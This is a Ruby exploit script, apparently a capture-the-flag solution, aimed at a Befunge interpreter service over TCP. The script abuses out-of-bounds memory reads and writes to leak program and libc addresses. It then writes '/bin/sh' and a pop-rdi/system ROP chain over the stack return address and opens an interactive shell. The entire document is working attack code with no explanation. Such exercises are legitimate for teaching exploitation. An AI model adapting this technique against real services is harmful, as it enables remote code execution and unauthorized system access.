require 'ctf'
program = <<EOS
&v& .g&< >
v_&&*&+^
>&&&*&+&p^
EOS
libc = CTF::Rop::RelocatableELF.new('./libc-2.19.so')
libc_system = libc.function('__libc_system')
libc_setvbuf = libc.function('_IO_setvbuf')
libc_environ = 0x3c14a0
libc_start_main = libc.function('__libc_start_main')
libc_pop_rdi = 0x00022b9a

got_setvbuf = 0x201fa0
program_rel_rel = 0x201fe0
program_rel = 0x202040
str_pos = 80 * 7
rop_pos = 80 * 8
program_abs = nil
M = 10 ** 7
def get_offset(s, ofs)
  s.puts 0
  if ofs > 0
    s.puts ofs / M
    s.puts M
    s.puts ofs % M
    s.puts 0
  else
    s.puts 0
    s.puts 0
    s.puts ofs
    s.puts 0
  end
  return s.expect(' ')[0].to_i
end
def write_byte(s, ofs, byte)
  s.puts 1
  s.puts byte
  if ofs > 0
    s.puts ofs / M
    s.puts M
    s.puts ofs % M
    s.puts 0
  else
    s.puts 0
    s.puts 0
    s.puts ofs
    s.puts 0
  end
end
def read_long(s, ofs)
  ret = 0
  t = 1
  8.times do |i|
    ret += t * [get_offset(s, ofs + i)].pack("c").unpack("C")[0]
    t *= 256
  end
  return ret
end
TCPSocket.open(*ARGV) do |s|
  while program.lines.size < 25
    program += "\n"
  end
  # s.echo = true
  s.print program
  25.times {s.expect('> ')}
  # get main offset
  program_abs = read_long(s, program_rel_rel - program_rel)
  p 'program_abs: %x' % program_abs
  setvbuf_abs = read_long(s, got_setvbuf - program_rel)
  p 'setvbuf_abs: %x' % setvbuf_abs
  libc_base = setvbuf_abs - libc_setvbuf
  p 'libc_base: %x' % libc_base
  "/bin/sh\0".each_char.with_index do |c,i|
    write_byte(s, str_pos + i, c.ord)
  end
  rop = [libc_pop_rdi + libc_base, str_pos + program_abs, libc_system + libc_base].pack("q*")
  p rop
  rop.unpack("C*").each.with_index do |c,i|
    write_byte(s, rop_pos + i, c)
  end
  p  libc_environ + libc_base - program_abs
  p  '%x' % (libc_environ + libc_base - program_abs)
  env = read_long(s, libc_environ + libc_base - program_abs);
  p 'env: %x' % env
  ofs = nil
  (20..200).each do |i|
    tr = nil
    if (tr = read_long(s, env - i * 8 - program_abs)) == libc_start_main + libc_base + 245
      p '%x:%016x,%d' % [env - i * 8, tr, i]
      p 'Found!!!'
      ofs = env - i * 8
      break
    end
    p '%x:%016x,%d' % [env - i * 8, tr, i]
  end

  # write
  rop.unpack("C*").each.with_index do |c,i|
    write_byte(s, ofs + i - program_abs, c)
  end
  2512.times do |i|
    s.puts 0
  end
  s.interactive!
end
